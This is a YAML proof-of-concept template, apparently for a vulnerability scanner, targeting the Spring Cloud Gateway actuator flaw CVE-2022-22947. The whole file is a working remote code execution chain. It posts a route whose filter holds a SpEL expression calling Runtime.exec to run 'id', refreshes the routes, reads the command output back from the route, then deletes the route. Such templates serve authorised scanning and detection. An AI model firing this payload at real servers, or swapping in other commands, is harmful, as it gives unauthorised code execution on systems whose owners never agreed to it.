name: poc-yaml-spring-cloud-gateway-cve-2022-22947-rce
manual: true
transport: http
set:
    s1: randomLowercase(10)
    s2: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /actuator/gateway/routes/{{s1}}
            headers:
                Content-Type: application/json
            body: '{"id": "{{s2}}","filters": [{"name": "AddResponseHeader","args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri": "http://example.com","order": 0}'
            follow_redirects: false
        expression: response.status == 201 && response.headers["Location"].contains("routes")
    r1:
        request:
            cache: true
            method: POST
            path: /actuator/gateway/refresh
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: false
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: GET
            path: /actuator/gateway/routes/{{s1}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"AddResponseHeader Result =")
    r3:
        request:
            cache: true
            method: DELETE
            path: /actuator/gateway/routes/{{s1}}
            follow_redirects: false
        expression: response.status == 200
expression: r0() && r1() && r2() && r3()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
